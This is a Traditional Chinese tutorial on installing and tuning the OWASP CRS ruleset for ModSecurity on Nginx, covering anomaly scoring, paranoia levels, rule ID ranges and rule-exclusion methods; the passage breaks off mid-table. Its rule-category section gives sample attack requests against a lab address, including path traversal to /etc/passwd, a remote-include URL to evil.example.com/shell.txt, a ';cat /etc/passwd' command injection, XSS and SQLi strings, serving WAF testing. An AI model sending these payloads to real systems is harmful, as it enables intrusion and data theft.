---
title: "OWASP CRS 規則集"
desc: "CRS 的目錄結構、Paranoia Level 與異常評分機制，以及三種排除寫法的影響範圍差異"
aliases: [crs, owasp]
tags: [群組/資訊安全, 安全/waf, 主題/規則]
category: WAF與ModSecurity
difficulty: 專家
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[090-04-01-svc-WAF-WAF概念與ModSecurity安裝]]"]
updated: 2026-09-03
---

# OWASP CRS 規則集

> [!abstract] 這篇你會學到
> - 分清楚 **ModSecurity 是引擎、CRS 是規則**，兩者各自負責什麼
> - CRS 的安裝方式與 `crs-setup.conf`／`rules/` 的目錄結構
> - ★★★★★ **異常評分機制**：為什麼規則命中了卻沒被擋
> - ★★★★★ **Paranoia Level PL1～PL4**：每一級多擋什麼、多誤判什麼，機關該從哪一級開始
> - 九大規則分類各自在擋什麼，每類配一個實際請求範例
> - **三種排除寫法**的影響範圍差異 —— 選錯會擋太多或擋不夠
> - 完整實戰：裝上 CRS、設 PL1 + DetectionOnly，實際觀察分數怎麼累加

---

## 這篇你會學到

上一篇 [[090-04-01-svc-WAF-WAF概念與ModSecurity安裝]] 把引擎裝好了，
但引擎裡只有一條你自己寫的冒煙測試規則。真正的防護力來自**規則集**。

本篇要做的事：

| # | 目標 | 重要度 |
| --- | --- | --- |
| 1 | 說清楚引擎與規則集的分工 | ★★★ |
| 2 | 裝好 CRS 並確認規則真的被載入 | ★★★★ |
| 3 | ★ 看懂「命中 3 條規則卻沒擋」的原因 —— 異常評分 | ★★★★★ |
| 4 | 決定這個站台要用哪個 Paranoia Level | ★★★★★ |
| 5 | 認得規則 ID 的號段，看到 ID 就知道是哪一類攻擊 | ★★★★ |
| 6 | 選對排除機制（三種寫法的差別） | ★★★★★ |
| 7 | 用測試請求觀察分數累加過程 | ★★★★ |

誤判的**系統性處理流程**留在 [[090-04-03-svc-ModSecurity-規則調校與誤判處理]]，
本篇只把機制講清楚。

---

## 前置知識

- ✅ 已完成 [[090-04-01-svc-WAF-WAF概念與ModSecurity安裝]]，
  Nginx 上的 ModSecurity v3 可以正常啟動，稽核日誌寫得出來
- ✅ 知道 `SecRuleEngine` 的三個值，且**目前是 `DetectionOnly`**
- ✅ 會看稽核日誌的 `H` 段
- ✅ 對 SQLi／XSS／LFI／RCE 有基本概念 —— [[090-03-02-guide-應用安全-應用層安全]]
- ✅ 讀過 [[090-05-04-guide-資安設備-Web應用防火牆WAF]] 對 CRS 的概觀介紹

> [!warning] ★★★★★ 開始前先確認引擎模式
> ```bash
> grep '^SecRuleEngine' /etc/nginx/modsec/modsecurity.conf
> ```
> ```text
> SecRuleEngine DetectionOnly
> ```
> **不是 `DetectionOnly` 就先改回去再繼續。**
> 在 `On` 的狀態下載入上千條 CRS 規則，幾乎必然當場擋掉正常使用者。

---

## 觀念說明

### ★★★★ 引擎與規則集：兩件不同的東西

這是初學者最常混淆的一點。

```text
┌──────────────────────────────────────────────────────────┐
│  ModSecurity（引擎）                                       │
│   - 解析 HTTP 請求，拆成 ARGS / HEADERS / BODY / FILES ...  │
│   - 提供 SecRule 語法：變數、運算子、動作、變數轉換           │
│   - 決定阻擋、記錄、放行                                     │
│   - 但它「本身不知道什麼是 SQL Injection」★★★★             │
└──────────────────────────────────────────────────────────┘
                              ▲
                              │ 餵給它規則
                              │
┌──────────────────────────────────────────────────────────┐
│  OWASP CRS（規則集）                                       │
│   - 上千條 SecRule，描述各種攻擊的特徵                       │
│   - 定義評分、分級（Paranoia Level）、例外機制               │
│   - 由 OWASP 社群維護，會隨新攻擊手法更新                    │
└──────────────────────────────────────────────────────────┘
```

| 比喻 | 對應 |
| --- | --- |
| 防毒軟體的**掃描引擎** | ModSecurity |
| 防毒軟體的**病毒碼** | OWASP CRS |

| 只有引擎沒有規則 | 只有規則沒有引擎 |
| --- | --- |
| 什麼都不擋，跟沒裝一樣 | 一堆文字檔，不會執行 |

> [!note] ★★★ CRS 不是唯一選擇
> 商用 WAF 有自家規則集；也可以完全自己寫規則（虛擬修補常這樣做）。
> 但 **CRS 是開源世界的事實標準**，涵蓋 OWASP Top 10 大部分項目，
> 而且免費、持續更新、社群大、遇到問題查得到答案。機關環境從 CRS 開始是正確的。

### CRS 的兩種運作模式 ★★★★

CRS 支援兩種完全不同的判定哲學，**新版預設是第二種**。

#### 傳統模式（Self-Contained / traditional mode）

```text
規則命中 ──▶ 立刻阻擋
```

- 優點：直覺、好除錯，日誌一看就知道是哪條擋的
- 缺點：★★★★ **誤判率極高**。單一條規則的判斷不可能同時做到「不漏」與「不誤」

#### ★★★★★ 異常評分模式（Anomaly Scoring Mode）—— CRS 預設

```text
規則 A 命中 ──▶ 加 5 分 ┐
規則 B 命中 ──▶ 加 5 分 ├──▶ 總分 13 ──▶ 超過門檻 5 ──▶ 阻擋
規則 C 命中 ──▶ 加 3 分 ┘
```

- 規則命中**不會直接擋**，只是把分數加到一個累計變數上
- 所有偵測規則跑完後，才有一條**評估規則**檢查總分是否超過門檻
- 超過才執行阻擋動作

> [!note] ★★★★★ 這是全篇最重要的一個觀念
> **「稽核日誌裡看到規則命中」不等於「這個請求被擋了」。**
>
> 現場最常見的兩種誤解：
> 1. 「日誌一堆 Warning，是不是使用者一直被擋？」
>    → 不是。可能只是加了 3 分，離門檻還很遠，請求正常放行了。
> 2. 「這條規則明明命中了，為什麼沒擋？」
>    → 因為分數沒過門檻。要看的是**評估規則**那一行，不是偵測規則那一行。
>
> 分不清這兩者，整個調校方向就會全錯。

### 嚴重度與分數的對應 ★★★★

CRS 用規則的 `severity` 決定加幾分：

| severity | 加分 | CRS 變數名 | 典型規則 |
| --- | --- | --- | --- |
| `CRITICAL` | **5** | `tx.critical_anomaly_score` | SQLi、XSS、RCE 的明確特徵 |
| `ERROR` | **4** | `tx.error_anomaly_score` | 回應內容的資料外洩 |
| `WARNING` | **3** | `tx.warning_anomaly_score` | 可疑但不確定的模式 |
| `NOTICE` | **2** | `tx.notice_anomaly_score` | 協定違規、格式不標準 |

門檻預設值：

| 方向 | 變數 | 預設 | 意義 |
| --- | --- | --- | --- |
| 入站 | `tx.inbound_anomaly_score_threshold` | **5** | ★★★★★ **一條 CRITICAL 就足以觸發阻擋** |
| 出站 | `tx.outbound_anomaly_score_threshold` | **4** | 一條 ERROR 就觸發 |

> [!warning] ★★★★ 「預設門檻 5」其實非常嚴格
> 因為一條 CRITICAL 規則就是 5 分。也就是說在預設設定下，
> **只要命中任何一條 CRITICAL 規則，請求就會被擋**，
> 跟傳統模式的差別沒有想像中大。
>
> 評分機制真正發揮作用的地方，是讓你**有一個可以量化調整的旋鈕**：
> 想寬鬆一點就把門檻調到 10 或 15，而不是一條一條關規則。
> 但——**調門檻是粗糙的做法**，理由見〈進階應用〉與 03 篇。

### 入站與出站的差別 ★★★

| | 入站（inbound） | 出站（outbound） |
| --- | --- | --- |
| 檢查對象 | 使用者送來的請求 | 你的應用回給使用者的內容 |
| phase | 1、2 | 3、4 |
| 抓什麼 | SQLi、XSS、RCE、掃描器 | 資料庫錯誤訊息、堆疊追蹤、原始碼外洩 |
| 門檻預設 | 5 | 4 |
| 效能成本 | 中 | ★★★ 高（要緩衝整個回應） |
| 誤判影響 | 使用者被擋 | ★★★★ **回應被截斷，畫面壞掉** |

> [!danger] ★★★★ 出站規則的誤判比入站更難察覺
> 入站誤判：使用者看到 403，會來客訴，你馬上知道。
> 出站誤判：使用者看到**半截的頁面**或空白，可能以為是自己網路問題，
> 而你的監控只看 HTTP 狀態碼，完全不會告警。
>
> 出站規則最常誤判的情境是：**技術文件網站**、**程式碼片段展示頁**、
> **含 SQL 教學內容的頁面** —— 頁面裡本來就有 SQL 語句與錯誤訊息範例。

---

## 安裝或基礎操作

### 安裝 CRS 的兩種方式

#### 方式一：發行版套件（簡單，版本可能舊）

```bash
sudo apt update
sudo apt install -y modsecurity-crs
ls /usr/share/modsecurity-crs/
```

```text
crs-setup.conf.distributed  owasp-crs.load  rules/  util/
```

> [!warning] ★★★ 套件版本可能落後
> `apt-cache policy modsecurity-crs` 看一下版本。CRS 主要版本之間
> （例如 3.x 到 4.x）**檔名、變數名、預設值都有變動**，
> 網路上找的教學要跟你裝的版本對得起來。

#### ★★★★ 方式二：從 Git 取得（推薦，版本自主）

```bash
sudo mkdir -p /etc/nginx/modsec
cd /etc/nginx/modsec
sudo git clone --depth 1 -b v4/master \
  https://github.com/coreruleset/coreruleset.git crs
```

```text
Cloning into 'crs'...
remote: Enumerating objects: 1234, done.
...
Resolving deltas: 100% (456/456), done.
```

```bash
ls /etc/nginx/modsec/crs/
```

```text
CHANGES.md  CONTRIBUTING.md  INSTALL.md  KNOWN_BUGS.md  LICENSE
README.md  crs-setup.conf.example  plugins/  rules/  tests/  util/
```

> [!tip] ★★★★ 用 git 的好處是規則檔納入版控
> 你之後會在 `rules/` 旁邊放自己的排除規則檔。用 git 管理的話，
> 升級 CRS 時可以清楚看到哪些規則檔變了，以及自己改過什麼。
> **但排除規則檔不要放在 `crs/` 目錄裡面**，放外面，避免 `git pull` 時衝突。

建立設定檔：

```bash
sudo cp /etc/nginx/modsec/crs/crs-setup.conf.example \
        /etc/nginx/modsec/crs-setup.conf
```

> [!note] ★★★ 為什麼把 `crs-setup.conf` 放到 `crs/` 外面
> 這樣升級 CRS（`git pull`）時，你的設定不會被覆蓋，也不會造成衝突。
> **升級時要做的只有一件事：對照新版的 `crs-setup.conf.example`
> 看有沒有新增的設定項需要補進來。**

### CRS 的目錄結構 ★★★★

```text
/etc/nginx/modsec/
├── modsecurity.conf              ← 引擎設定（上一篇建的）
├── unicode.mapping
├── crs-setup.conf                ← ★★★★★ CRS 的總設定：PL、門檻、允許清單
├── main.conf                     ← 總入口，控制 Include 順序
├── crs-exclusions-before.conf    ← ★★★★ 你的排除規則（CRS 之前）
├── crs-exclusions-after.conf     ← ★★★★ 你的排除規則（CRS 之後）
└── crs/                          ← git clone 下來的 CRS，盡量不要動
    ├── crs-setup.conf.example
    ├── rules/
    │   ├── REQUEST-901-INITIALIZATION.conf
    │   ├── REQUEST-905-COMMON-EXCEPTIONS.conf
    │   ├── REQUEST-911-METHOD-ENFORCEMENT.conf
    │   ├── REQUEST-913-SCANNER-DETECTION.conf
    │   ├── REQUEST-920-PROTOCOL-ENFORCEMENT.conf
    │   ├── REQUEST-921-PROTOCOL-ATTACK.conf
    │   ├── REQUEST-930-APPLICATION-ATTACK-LFI.conf
    │   ├── REQUEST-931-APPLICATION-ATTACK-RFI.conf
    │   ├── REQUEST-932-APPLICATION-ATTACK-RCE.conf
    │   ├── REQUEST-933-APPLICATION-ATTACK-PHP.conf
    │   ├── REQUEST-941-APPLICATION-ATTACK-XSS.conf
    │   ├── REQUEST-942-APPLICATION-ATTACK-SQLI.conf
    │   ├── REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf
    │   ├── REQUEST-949-BLOCKING-EVALUATION.conf        ← ★★★★★ 入站評分判定
    │   ├── RESPONSE-950-DATA-LEAKAGES.conf
    │   ├── RESPONSE-959-BLOCKING-EVALUATION.conf       ← ★★★★★ 出站評分判定
    │   ├── RESPONSE-980-CORRELATION.conf               ← ★★★★ 總結日誌訊息
    │   ├── REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example
    │   └── RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example
    ├── plugins/
    └── util/
```

> [!warning] 未實機驗證
> 上面的檔名清單是 CRS 常見的組成，**不同主要版本會增刪檔案**
> （例如 Java、Node.js、多重編碼相關的規則檔在不同版本存在與否不同）。
> 請以 `ls /etc/nginx/modsec/crs/rules/` 的實際輸出為準。

### ★★★★ 規則檔命名的三段式

```text
REQUEST-942-APPLICATION-ATTACK-SQLI.conf
   │      │            │
   │      │            └─ 攻擊類別
   │      └────────────── 規則 ID 號段（這個檔裡的規則 ID 都是 942xxx）
   └───────────────────── 檢查方向：REQUEST（入站）/ RESPONSE（出站）
```

**看到日誌裡的規則 ID，第一時間就能判斷是哪一類。**

| ID 號段 | 類別 | 說明 |
| --- | --- | --- |
| 900xxx | 初始化與設定 | `crs-setup.conf` 裡的 SecAction |
| 901xxx | 初始化 | 變數初始化，★★★ 這個檔不能不載入 |
| 905xxx | 常見例外 | Apache 內部請求等 |
| 910xxx | IP 信譽 | |
| 911xxx | HTTP 方法限制 | 只允許 GET/POST/HEAD 等 |
| 912xxx | DoS 防護 | |
| 913xxx | 掃描器偵測 | nikto、sqlmap、nmap 的指紋 |
| 920xxx | 協定強制 | HTTP 規範符合性 |
| 921xxx | 協定攻擊 | HTTP Request Smuggling、標頭注入 |
| 930xxx | LFI | 本地檔案引入、路徑穿越 |
| 931xxx | RFI | 遠端檔案引入 |
| 932xxx | RCE | 遠端指令執行 |
| 933xxx | PHP 注入 | |
| 941xxx | XSS | |
| 942xxx | SQL Injection | ★★★★ 誤判最多的一類 |
| 943xxx | Session Fixation | |
| **949xxx** | ★★★★★ **入站阻擋評估** | 分數判定就在這裡 |
| 95xxxx | 資料外洩（出站） | |
| **959xxx** | ★★★★★ **出站阻擋評估** | |
| 980xxx | 關聯與總結 | ★★★★ 日誌裡的總分訊息來自這裡 |

> [!warning] ★★★★★ 不要編造規則 ID
> 本篇刻意**不列出任何一條具體的規則 ID**。
> 原因是：不同 CRS 版本的規則 ID 會增刪，抄一個過期的 ID 寫進排除規則，
> 結果就是「排除了一條不存在的規則，誤判照樣發生」，而且你會以為已經處理完了。
>
> **正確做法永遠是：從你自己的稽核日誌裡把 ID 抄出來。**
> 需要在文件裡舉例時，寫「某條 SQLi 規則（實際 ID 以你安裝的 CRS 版本為準）」。

### 掛上 CRS：修改 `main.conf` ★★★★★

**載入順序決定一切**，這個順序不能亂。

```apache
# /etc/nginx/modsec/main.conf

# ── 1. 引擎設定 ────────────────────────────────
Include /etc/nginx/modsec/modsecurity.conf

# ── 2. CRS 總設定（PL、門檻、允許清單）────────────
Include /etc/nginx/modsec/crs-setup.conf

# ── 3. ★★★★ 執行期排除（必須在 CRS 規則之前）──────
#     ctl:ruleRemoveTargetById 這類寫法放這裡
Include /etc/nginx/modsec/crs-exclusions-before.conf

# ── 4. CRS 規則本體 ──────────────────────────
Include /etc/nginx/modsec/crs/rules/*.conf

# ── 5. ★★★★ 設定期排除（必須在 CRS 規則之後）──────
#     SecRuleRemoveById / SecRuleUpdateTargetById 放這裡
Include /etc/nginx/modsec/crs-exclusions-after.conf
```

> [!danger] ★★★★★ 排除規則放錯位置會完全無效，而且不會報錯
> - `SecRuleRemoveById` 與 `SecRuleUpdateTargetById` 是**設定期**指令，
>   它們要修改的規則**必須已經被載入**。放在 CRS 之前 → 找不到那條規則 → 靜默失效。
> - `ctl:ruleRemoveTargetById` 是**執行期**動作，它必須在目標規則執行**之前**跑到。
>   放在 CRS 之後 → 目標規則早就跑完了 → 靜默失效。
>
> **兩種放錯都不會有錯誤訊息**，你會以為排除好了，實際上誤判照樣發生。
> 這是 CRS 調校最常見的挫折來源。

先建立兩個空的排除檔：

```bash
sudo tee /etc/nginx/modsec/crs-exclusions-before.conf > /dev/null <<'EOF'
# 執行期排除規則（ctl:ruleRemoveTargetById 等）
# 必須在 CRS 規則之前載入
EOF

sudo tee /etc/nginx/modsec/crs-exclusions-after.conf > /dev/null <<'EOF'
# 設定期排除規則（SecRuleRemoveById / SecRuleUpdateTargetById 等）
# 必須在 CRS 規則之後載入
EOF
```

驗證：

```bash
sudo nginx -t
```

```text
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
```

```bash
sudo systemctl reload nginx
```

### `crs-setup.conf` 的關鍵設定 ★★★★★

打開檔案，絕大多數區塊都是註解掉的 `SecAction`。**要啟用就是把註解拿掉。**

#### 設定 1：Paranoia Level

```apache
SecAction \
 "id:900000,\
  phase:1,\
  nolog,\
  pass,\
  t:none,\
  setvar:tx.blocking_paranoia_level=1"
```

> [!warning] ★★★★ 變數名稱在不同 CRS 版本不同
> 較舊的 CRS 用 `tx.paranoia_level`，較新的分成
> `tx.blocking_paranoia_level`（實際阻擋用）與
> `tx.detection_paranoia_level`（只記錄用）。
>
> **不要憑記憶寫，打開你那份 `crs-setup.conf.example` 看它自己寫什麼。**
> 上面的規則 ID `900000` 也以你手上檔案為準。

#### 設定 2：異常分數門檻 ★★★★★

```apache
SecAction \
 "id:900110,\
  phase:1,\
  nolog,\
  pass,\
  t:none,\
  setvar:tx.inbound_anomaly_score_threshold=5,\
  setvar:tx.outbound_anomaly_score_threshold=4"
```

#### 設定 3：各嚴重度的加分（★★ 通常不用改）

```apache
SecAction \
 "id:900100,\
  phase:1,\
  nolog,\
  pass,\
  t:none,\
  setvar:tx.critical_anomaly_score=5,\
  setvar:tx.error_anomaly_score=4,\
  setvar:tx.warning_anomaly_score=3,\
  setvar:tx.notice_anomaly_score=2"
```

> [!danger] ★★★★ 不要靠改這裡來「減少誤判」
> 有人為了少誤判，把 `critical_anomaly_score` 從 5 改成 1。
> 效果是：**所有 CRITICAL 規則同時被削弱**，包含真正的 SQLi 偵測。
> 這叫「把警報器音量調小來解決警報太吵的問題」。
> 正確做法是針對誤判的那個 URI 與參數做排除，見〈進階應用〉與 03 篇。

#### 設定 4：允許的方法／Content-Type／副檔名 ★★★

`crs-setup.conf` 裡還有幾組允許清單（以變數名稱辨識，ID 以你的檔案為準）：

| 變數 | 用途 | 典型誤判 |
| --- | --- | --- |
| `tx.allowed_methods` | 允許的 HTTP 方法 | ★★★★ REST API 用 `PUT`/`PATCH`/`DELETE` 會被擋 |
| `tx.allowed_request_content_type` | 允許的 Content-Type | ★★★★ `application/json` 少了會擋掉整個 API |
| `tx.allowed_http_versions` | 允許的 HTTP 版本 | HTTP/2、HTTP/3 |
| `tx.restricted_extensions` | 禁止存取的副檔名 | `.bak`、`.log`、`.sql` |
| `tx.restricted_headers` | 禁止的請求標頭 | |

> [!warning] ★★★★ REST API 站台第一件要改的就是允許方法與 Content-Type
> 這兩項是 API 站台裝上 CRS 之後**最先炸掉**的地方，
> 而且症狀是「整個 API 全部不能用」，不是零星誤判。
> 上線前先確認清單裡有你 API 用到的所有方法與 Content-Type。

#### 設定 5：抽樣百分比 ★★★

```apache
# 只讓 10% 的流量經過 CRS
# setvar:tx.sampling_percentage=10
```

大流量站台導入時可以先抽樣，觀察誤判與效能後再逐步調高到 100。

> [!note] ★★★ 抽樣是導入期的工具，不是長期設定
> 抽樣代表 90% 的攻擊不會被檢查。調校完成後務必調回 100。

---

## 進階應用

### ★★★★★ Paranoia Level 深入

PL 是 CRS 的「敏感度旋鈕」。**每一條 CRS 規則都被標記了它屬於哪一級**，
設定 PL=N 表示載入並執行 **PL1 到 PLN 的所有規則**。

```text
PL1  ████                        基礎規則
PL2  ████████                    + 較嚴格的模式比對
PL3  ████████████                + 更激進的字元與關鍵字偵測
PL4  ████████████████            + 極端嚴格，幾乎不容許特殊字元

漏抓率 ◀────────────────────────▶ 誤判率
```

| PL | 擋什麼 | 誤判狀況 | 適用 |
| --- | --- | --- | --- |
| **PL1** | 明確的攻擊特徵：典型 SQLi、XSS payload、掃描器指紋、路徑穿越 | ★★ **少**，但仍有（後台編輯器、含特殊字元的密碼） | ★★★★★ **預設值，所有導入的起點** |
| **PL2** | + 較寬鬆的比對，抓得到部分變形 payload | ★★★ 明顯上升。含 HTML、SQL 關鍵字的正常內容開始被擋 | 調校成熟、內容單純的站台 |
| **PL3** | + 對特殊字元、關鍵字組合更敏感 | ★★★★ 高。一般網站幾乎無法直接使用 | 高風險系統，且有專人長期調校 |
| **PL4** | + 極端嚴格，接近「白名單思維」 | ★★★★★ 極高。連正常中文內容都可能觸發 | 幾乎只在極高安全需求且輸入格式嚴格受控時使用 |

> [!danger] ★★★★★ 機關導入一律從 PL1 開始
> 沒有例外。理由：
>
> 1. PL1 已經涵蓋 OWASP Top 10 的**大部分實際攻擊**
> 2. PL1 的誤判量是「可以在兩週內逐一處理完」的量級
> 3. PL2 以上的誤判量會讓你根本處理不完，最後放棄整個 WAF
>
> **正確的順序是：PL1 調校到零誤判 → 穩定運行三個月 → 才考慮是否要 PL2。**
> 而且升 PL 要重跑一次完整的 `DetectionOnly` 觀察期。

> [!danger] ★★★★★ 「調高 PL 提升安全性」是一個陷阱
> 常見的錯誤決策鏈：
>
> ```text
> 稽核委員說「PL1 不夠嚴格」
>   → 調到 PL3
>     → 誤判暴增，客訴湧入
>       → 為了止血把 SecRuleEngine 改成 Off
>         → 現在你的安全性是「零」
> ```
>
> **PL1 + 認真調校 + 認真看日誌** 的實際防護力，
> 遠高於 **PL3 + 被關掉**。寫進導入報告裡跟稽核溝通。

#### 只提高偵測不提高阻擋 ★★★★

新版 CRS 把 PL 拆成兩個變數，可以做到「用 PL2 偵測、但只用 PL1 阻擋」：

```apache
# 阻擋用 PL1（只有 PL1 規則的分數會計入阻擋判定）
setvar:tx.blocking_paranoia_level=1
# 偵測用 PL2（PL2 規則仍會執行並記錄，方便你評估升級的影響）
setvar:tx.detection_paranoia_level=2
```

這是**評估要不要升 PL 的正確方法**：先開偵測，觀察兩週，
統計 PL2 規則會造成多少誤判，再決定要不要真的升。

> [!warning] 未實機驗證
> 這兩個變數名在較舊的 CRS 版本不存在。請確認你的 `crs-setup.conf.example`
> 裡有沒有這兩項，沒有就代表你的版本只支援單一 PL 設定。

---

### 規則分類導覽（每類配一個實際請求）★★★★

以下每一類都給一個**實際會命中的請求範例**。
可以直接在你的實驗機上發，然後去稽核日誌看它命中了什麼。

> [!danger] ★★★★★ 只在你自己的測試機上發這些請求
> 對別人的系統發這些請求可能觸犯法律。機關內部測試也要有書面授權，
> 見 [[090-03-06-guide-應用安全-委外系統上線前資安檢測]]。

#### 1. 協定強制（920xxx）★★★

檢查請求是否符合 HTTP 規範：缺 Host、Content-Length 與實際不符、
非法字元、可疑的方法。

```bash
# 缺少 Host 標頭（HTTP/1.1 規範要求必須有）
printf 'GET / HTTP/1.1\r\n\r\n' | nc 192.168.56.20 80
```

**典型誤判**：老舊的內部監控腳本、印表機、IoT 設備的 HTTP 實作不標準。★★★

#### 2. 協定攻擊（921xxx）★★★

HTTP Request Smuggling、標頭注入、Response Splitting。

```bash
# 在參數中夾帶換行，嘗試注入標頭
curl -s -o /dev/null -w '%{http_code}\n' \
  --get --data-urlencode $'redirect=/home\r\nSet-Cookie: admin=1' \
  http://192.168.56.20/
```

#### 3. 掃描器偵測（913xxx）★★

比對已知掃描工具的 User-Agent 與行為特徵。

```bash
curl -s -o /dev/null -A "sqlmap/1.8#stable (https://sqlmap.org)" \
  http://192.168.56.20/
```

**典型誤判**：★★★ 你自己排定的弱點掃描作業會被擋。
記得把掃描來源 IP 加入例外，或掃描期間暫時調整。

#### 4. LFI 本地檔案引入（930xxx）★★★★

```bash
curl -s -o /dev/null \
  "http://192.168.56.20/?file=../../../../etc/passwd"
```

**典型誤判**：★★★★ **參數值本來就含路徑的功能**，
例如檔案管理器、文件下載連結 `?path=/uploads/2026/report.pdf`。

#### 5. RFI 遠端檔案引入（931xxx）★★★

```bash
curl -s -o /dev/null \
  "http://192.168.56.20/?page=http://evil.example.com/shell.txt"
```

**典型誤判**：★★★★ **參數值本來就是 URL 的功能**，
例如「回呼網址」、「圖片代理」、OAuth 的 `redirect_uri`。

#### 6. RCE 遠端指令執行（932xxx）★★★★

```bash
curl -s -o /dev/null \
  --get --data-urlencode "cmd=;cat /etc/passwd" \
  http://192.168.56.20/
```

**典型誤判**：★★★★ 參數值含 Unix 指令名稱的正常內容。
中文站台意外的常見來源是**檔名或標題含 `cat`、`ping`、`id`、`env` 這類短字串**。

#### 7. XSS（941xxx）★★★★★

```bash
curl -s -o /dev/null \
  --get --data-urlencode "q=<script>alert(1)</script>" \
  http://192.168.56.20/
```

**典型誤判**：★★★★★ **後台富文字編輯器**。
使用者在 CMS 編輯一篇含 `<b>`、`<img src=...>`、`onclick` 的文章並儲存，
POST 本體整段就是 HTML —— 從 WAF 的角度看，這跟 XSS 攻擊長得一模一樣。
**這是 WAF 導入的頭號誤判來源。**

#### 8. SQL Injection（942xxx）★★★★★

```bash
curl -s -o /dev/null \
  --get --data-urlencode "id=1' OR '1'='1" \
  http://192.168.56.20/
curl -s -o /dev/null \
  --get --data-urlencode "id=1 UNION SELECT username,password FROM users" \
  http://192.168.56.20/
```

**典型誤判**：★★★★★ 誤判數量的冠軍。常見來源：
- 搜尋框輸入含 `select`、`union`、`or`、`--`、`'` 的一般文字
- 姓名含撇號（`O'Brien`）
- 密碼欄位含 `'` 或 `--`
- 技術類網站的文章內容本來就在講 SQL

#### 9. Session Fixation（943xxx）★★

偵測 URL 或表單試圖設定 session cookie 的行為。

#### 10. 資料外洩（出站，95xxxx）★★★

偵測回應內容中的資料庫錯誤訊息、堆疊追蹤、原始碼。

```bash
# 若後端故意回傳一段 SQL 錯誤訊息，出站規則會命中
curl -s http://192.168.56.20/debug-error
```

**典型誤判**：★★★★ 技術文件站、程式教學站、有 debug 頁面的內部系統。

---

### ★★★★★ 排除機制的三種寫法

**這一段選錯，不是擋太多就是擋不夠。**

#### 寫法一：`SecRuleRemoveById` —— 影響範圍最大

```apache
# 放在 crs-exclusions-after.conf
SecRuleRemoveById 942100
```

| 面向 | 說明 |
| --- | --- |
| 影響範圍 | ★★★★★ **整個站台、所有 URI、所有參數** |
| 效果 | 這條規則從此完全不存在 |
| 何時可用 | 這條規則對你的環境**完全沒有意義**（例如你根本不用 PHP，卻在擋 PHP 注入） |
| 何時不該用 | ★★★★★ 只是「某個後台頁面誤判」就用這個 → **全站失去這條規則的保護** |

還有依標籤與訊息的變體，範圍更大，更要小心：

```apache
SecRuleRemoveByTag "attack-sqli"      # ★★★★★ 極危險，等於關掉整類 SQLi 偵測
SecRuleRemoveByMsg "SQL Injection Attack"
```

> [!danger] ★★★★★ `SecRuleRemoveByTag "attack-sqli"` 幾乎永遠是錯的
> 這一行等於「我不要 SQL Injection 防護了」。
> 現場真的看過有人為了解決一個後台誤判而寫下這行，
> 然後在報告上寫「WAF 已導入完成」。

#### 寫法二：`SecRuleUpdateTargetById` —— 影響範圍中等 ★★★★

不是刪掉規則，而是**把某個變數從這條規則的檢查目標中拿掉**。

```apache
# 放在 crs-exclusions-after.conf
# 這條規則不再檢查名為 content 的參數（但仍檢查其他所有參數）
SecRuleUpdateTargetById 942100 "!ARGS:content"
```

| 面向 | 說明 |
| --- | --- |
| 影響範圍 | ★★★ **全站的這個參數名**，其他參數仍受保護 |
| 效果 | 精準度中等 |
| 何時用 | 某個參數名在全站都會有這種內容（例如所有頁面的 `content` 都是 HTML） |
| 限制 | ★★★★ **不能限定 URI**。若只有後台的 `content` 需要放行，前台的 `content` 也一起被放行了 |

也可以一次排除多條規則：

```apache
SecRuleUpdateTargetByTag "attack-xss" "!ARGS:editor_body"
```

#### ★★★★★ 寫法三：`ctl:ruleRemoveTargetById` —— 影響範圍最小（最推薦）

用一條**自訂規則**先判斷 URI，符合才對後續規則做排除。

```apache
# 放在 crs-exclusions-before.conf（必須在 CRS 規則之前！）
SecRule REQUEST_URI "@beginsWith /admin/article/save" \
    "id:1100001,\
     phase:2,\
     pass,\
     nolog,\
     ctl:ruleRemoveTargetById=942100;ARGS:content"
```

| 面向 | 說明 |
| --- | --- |
| 影響範圍 | ★★★★★ **只有這個 URI 的這個參數的這條規則** |
| 效果 | 精準度最高，其餘全部維持保護 |
| 何時用 | **絕大多數的誤判都該用這種寫法** |
| 注意 | ★★★★★ 必須放在 CRS 規則**之前**載入，否則靜默失效 |

`ctl:` 家族還有：

| 動作 | 效果 | 危險度 |
| --- | --- | --- |
| `ctl:ruleRemoveTargetById=ID;VAR` | 移除某規則的某個檢查目標 | ★ 最安全 |
| `ctl:ruleRemoveTargetByTag=TAG;VAR` | 移除某類規則的某個檢查目標 | ★★ |
| `ctl:ruleRemoveById=ID` | 在這個請求中完全停用某條規則 | ★★★ |
| `ctl:ruleEngine=Off` | ★★★★★ **這個請求完全不過 WAF** | 極危險 |
| `ctl:requestBodyAccess=Off` | 這個請求不檢查本體 | ★★★★ |

> [!danger] ★★★★★ `ctl:ruleEngine=Off` 是最後手段
> 它代表「這個路徑完全放棄 WAF 保護」。
> 只有在該路徑確定不接受任何使用者輸入（純內部 webhook、
> 且已用 IP 白名單與簽章保護）時才考慮。
> **不要拿它來當「這個頁面誤判太多，先關掉」的快速解法。**

#### 三種寫法對照 ★★★★★

| 寫法 | 範圍 | 放在哪個檔 | 何時用 |
| --- | --- | --- | --- |
| `SecRuleRemoveById` | 全站 × 全參數 | `-after` | 規則對本環境完全無意義 |
| `SecRuleRemoveByTag` | 全站 × 全參數 × 整類 | `-after` | ★★★★★ 幾乎不該用 |
| `SecRuleUpdateTargetById` | 全站 × 單一參數 | `-after` | 該參數名全站都會有這種內容 |
| `ctl:ruleRemoveTargetById` | 單一 URI × 單一參數 | ★★★★★ `-before` | **預設選這個** |
| `ctl:ruleEngine=Off` | 單一 URI × 全部 | `-before` | 最後手段 |

> [!tip] ★★★★ 一句話決策
> **「能限定到 URI + 參數 + 規則 ID 的，就不要用範圍更大的寫法。」**
> 每放寬一格，就是多一塊沒有保護的攻擊面。
> 完整的排除撰寫流程見 [[090-04-03-svc-ModSecurity-規則調校與誤判處理]]。

---

### CRS 外掛（Plugins）★★★

CRS 4 之後引入 **plugin** 機制，讓針對特定應用的排除規則可以獨立打包，
不必混在你自己的設定裡。

```text
/etc/nginx/modsec/crs/plugins/
├── <plugin-name>-config.conf     ← 設定
├── <plugin-name>-before.conf     ← 在 CRS 規則之前執行
└── <plugin-name>-after.conf      ← 在 CRS 規則之後執行
```

常見用途：

| 用途 | 說明 |
| --- | --- |
